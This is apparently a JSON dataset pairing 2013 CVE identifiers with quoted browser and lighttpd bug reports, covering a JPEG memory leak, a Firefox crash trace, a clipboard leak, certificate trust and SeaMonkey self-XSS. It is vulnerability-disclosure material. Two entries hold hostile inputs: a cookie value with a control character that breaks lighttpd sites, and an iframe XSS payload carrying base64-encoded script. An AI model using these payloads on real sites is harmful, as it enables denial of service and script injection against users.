forbidden (also multiple spaces can get replaced by a single one). I think this could use a CVE. The problem was reported in our lighttpd bug tracker: http://redmine.lighttpd.net/issues/2188 Kind regards, Stefan Testing the bug: Try one of the listed urls in the ticket (the error should trigger after a reload). If you have noscript, request policy, referer control or similar stuff running you are probably safe; to test the bug in this case you need a Javascript console on a lighttpd site (http://lighttpd.net for example), and enter: document.cookie = \"foo=bar\\x05test\" Try to reload the page - it should return a 400 Bad Request page now. document.cookie = \"foo=\" And it should work again. HTTP references: http://tools.ietf.org/html/rfc2616 message-header = field-name \":\" [ field-value ] field-name = token field-value = *( field-content | LWS ) field-content = *TEXT | *(token | separators | quoted-string) LWS = [CRLF] 1*( SP | HTAB ) # TEXT is superset of (token | separators | quoted-string) TEXT = LWS | %x21-7E | %x80-FF http://tools.ietf.org/html/draft-ietf-httpbis-p1-messaging-22 header-field = field-name \":\" OWS field-value BWS field-name = token field-value = *( field-content / obs-fold ) field-content = *( HTAB / SP / VCHAR / obs-text ) obs-fold = CRLF ( SP / HTAB ) # obsolete text obs-text = %x80-FF Basic definitions: # horizontal tab HTAB = %x09 # space SP = %x20 # visible ASCII VCHAR = %x21-7E # carriage return + line feed CRLF = %0x0D %0x0A"
      }
    ],
    "CVE-2013-6629": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=891693",
        "title": "JPEG info leak",
        "description": "This page contains an alternating pattern of kitty.jpg (a legit hello kitty image) and 55.jpg, an image that is 'decoded' to what looks like uninitialized memory: http://lcamtuf.coredump.cx/jpeg_leak/ In most browsers, reloading this page a couple of times eventually causes a distorted version of 'hello kitty' to appear in one of the 55.jpg squares. In Firefox, it's relatively difficult to hit that condition, but it still happens every now and then. At the bare minimum, this + <canvas> seems like a way to steal images across domains, although I suspect that the memory may contain non-image stuff, too. Safari & others are also affected."
      }
    ],
    "CVE-2013-6630": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=891693",
        "title": "JPEG info leak",
        "description": "This page contains an alternating pattern of kitty.jpg (a legit hello kitty image) and 55.jpg, an image that is 'decoded' to what looks like uninitialized memory: http://lcamtuf.coredump.cx/jpeg_leak/ In most browsers, reloading this page a couple of times eventually causes a distorted version of 'hello kitty' to appear in one of the 55.jpg squares. In Firefox, it's relatively difficult to hit that condition, but it still happens every now and then. At the bare minimum, this + <canvas> seems like a way to steal images across domains, although I suspect that the memory may contain non-image stuff, too. Safari & others are also affected."
      }
    ],
    "CVE-2013-6671": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=930281",
        "title": "SEGV in libxul.so!nsGfxScrollFrameInner::IsLTR()",
        "description": "Found by the BlackBerry Security Automated Analysis Team's fuzzing framework ALF. ==30229==ERROR: AddressSanitizer: SEGV on unknown address 0x00011fff8000 (pc 0x7f45f6cafc26 sp 0x7fff5a2f0220 bp 0x7fff5a2f02d0 T0) AddressSanitizer can not provide additional info. #0 0x7f45f6cafc25 (libxul.so!nsGfxScrollFrameInner::IsLTR() const+0x2c5) Line 3411 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/generic/nsGfxScrollFrame.cpp\" #1 0x7f45f6c91da3 (libxul.so!nsHTMLScrollFrame::ReflowContents(ScrollReflowState*, nsHTMLReflowMetrics const&)+0x643) Line 4129 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/generic/nsGfxScrollFrame.cpp\" #2 0x7f45f6c93cad (libxul.so!nsHTMLScrollFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&)+0xbad) Line 795 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/generic/nsGfxScrollFrame.cpp\" #3 0x7f45f6c16a33 (libxul.so!nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*)+0x113) Line 961 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/generic/nsContainerFrame.cpp\" #4 0x7f45f6db94a7 (libxul.so!ViewportFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&)+0x6e7) Line 221 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/generic/nsViewportFrame.cpp\" #5 0x7f45f6b02cea (libxul.so!PresShell::DoReflow(nsIFrame*, bool)+0x96a) Line 7905 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsPresShell.cpp\" #6 0x7f45f6b1441b (libxul.so!PresShell::ProcessReflowCommands(bool)+0x25b) Line 8046 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsPresShell.cpp\" #7 0x7f45f6b13d35 (libxul.so!PresShell::FlushPendingNotifications(mozilla::ChangesToFlush)+0xa25) Line 3869 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsPresShell.cpp\" #8 0x7f45f6b456e4 (libxul.so!nsRefreshDriver::Tick(long, mozilla::TimeStamp)+0x1d54) Line 1159 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsRefreshDriver.cpp\" #9 0x7f45f6b4a4e0 (libxul.so!mozilla::RefreshDriverTimer::Tick()+0x1f0) Line 168 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/layout/base/nsRefreshDriver.cpp\" #10 0x7f45fa638c31 (libxul.so!nsTimerImpl::Fire()+0x6d1) Line 546 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsTimerImpl.cpp\" #11 0x7f45fa6392d6 (libxul.so!nsTimerEvent::Run()+0x66) Line 630 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsTimerImpl.cpp\" #12 0x7f45fa630019 (libxul.so!nsThread::ProcessNextEvent(bool, bool*)+0xaa9) Line 622 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/threads/nsThread.cpp\" #13 0x7f45fa55c371 (libxul.so!NS_ProcessNextEvent(nsIThread*, bool)+0xb1) Line 251 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/xpcom/glue/nsThreadUtils.cpp\" #14 0x7f45f91a9091 (libxul.so!mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*)+0x311) Line 85 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/ipc/glue/MessagePump.cpp\" #15 0x7f45fa74b653 (libxul.so!MessageLoop::Run()+0x1c3) Line 220 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/ipc/chromium/src/base/message_loop.cc\" #16 0x7f45f8f87cac (libxul.so!nsBaseAppShell::Run()+0x5c) Line 161 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/widget/xpwidgets/nsBaseAppShell.cpp\" #17 0x7f45f8989d9e (libxul.so!nsAppStartup::Run()+0xbe) Line 268 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/components/startup/nsAppStartup.cpp\" #18 0x7f45f5f131c5 (libxul.so!XREMain::XRE_mainRun()+0x1e05) Line 3886 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsAppRunner.cpp\" #19 0x7f45f5f140fa (libxul.so!XREMain::XRE_main(int, char**, nsXREAppData const*)+0x4fa) Line 3954 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsAppRunner.cpp\" #20 0x7f45f5f1502b (libxul.so!XRE_main+0x3ab) Line 4156 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/toolkit/xre/nsAppRunner.cpp\" #21 0x459d1d (firefox!main+0x94d) Line 275 of \"/builds/slave/m-in-l64-asan-0000000000000000/build/browser/app/nsBrowserApp.cpp\" #22 0x7f460568876c (libc.so.6!__libc_start_main+0xec) Line 226 of \"libc-start.c\" #23 0x45929c (firefox!_start+0x28) ==30229==ABORTING"
      }
    ],
    "CVE-2013-6672": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=894736",
        "title": "Under Linux, a script can read clipboard data when PRIMARY selection paste (with middle-click) is used",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:25.0) Gecko/20130715 Firefox/25.0 (Nightly/Aurora) Build ID: 20130715100109 Steps to reproduce: 1. Open https://twitter.com/ and log in. 2. Open some other page in a new tab, e.g. https://bugzilla.mozilla.org/ 3. From this page, selects some text, e.g. \"Bugzilla@Mozilla\", and type Ctrl-C to copy the text to the clipboard. 4. Select some other text, e.g. \"Main Page\". 5. Go back to the Twitter tab and click with the middle button in the \"Compose new Tweet...\" area. Actual results: \"Bugzilla@Mozilla\" is pasted. Expected results: \"Main Page\" should have been pasted, i.e. the contents of the PRIMARY selection, not the contents of the clipboard. This is potentially a security problem, as the contents of the clipboard may not be intended to be made public, which can occur due to this bug if the user doesn't take care of what has really been pasted. If the pasted contents are directly available to the web site (without further action such as clicking on the \"Tweet\" button), this would be even worse..."
      }
    ],
    "CVE-2013-6673": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=917380",
        "title": "Extended validation root certificates are trusted even if the user has explicitly removed their trust",
        "description": "User Agent: Mozilla/5.0 (Stop!Hacker!; rv:24.0) Gecko/20130524 Firefox/24.0 (Nightly/Aurora) Build ID: 20130917030214 Steps to reproduce: This is in firefox nightly build 26.0a1. I tried to open a website that has a secure connection. However, something strange happened. Actual results: When I tried to open a website signed by Entrust, Inc. Although I edit the CA settings in the certificate manager that this certificate is not trusted, the connection will still go through without showing The connection is untrusted\". Also, when I opened the certificate manager and change a CA settings, I closed it, firefox will crash after I reopen certificate manager. Test Website: https://order.dominos.com/en/pages/order/menu.jsp#/menu/category/all/ With \"Entrust Inc\" Root certificate untrusted, the certificate is still trusted. Expected results: It should appear \"The connection is untrusted, because the root certificate is untrusted.\""
      }
    ],
    "CVE-2013-6674": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=868267",
        "title": "HTML mail compose self-XSS due to signature text",
        "description": "From:<fabiancuchietti@hotmail.com> To: \"security@mozilla.org\" <security@mozilla.org> Subject: SeaMonkey Mail 2.17.1 - Cross-site Scripting Stored. Date: Thu, 2 May 2013 13:08:24 -0300 -----//----- Hello Mozilla Security Team, Today i found a Cross-site Scripting in Sea Monkey Mail. Details: Software: Sea Monkey Version: 2.17.1 Tested on: Windows 7 Vulnerability: Cross-site Scripting Stored Steps to reproduce: 1 ) First install SeaMonkey, then open Mail and go to the Accounts option 2 ) Click in \"View setting for this account\" 3 ) Now select the text box of \"signature\" left labeled \"Use HTML\" and insert the following payload: 3.p) \"><iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4\"> 4) We save the settings click in OK, and we will compose a new mail.Cross-site Scripting successfully! Proof of Concept: Screenshots. Best Regards, Fabin Cuchietti."
      }
    ]
  }
}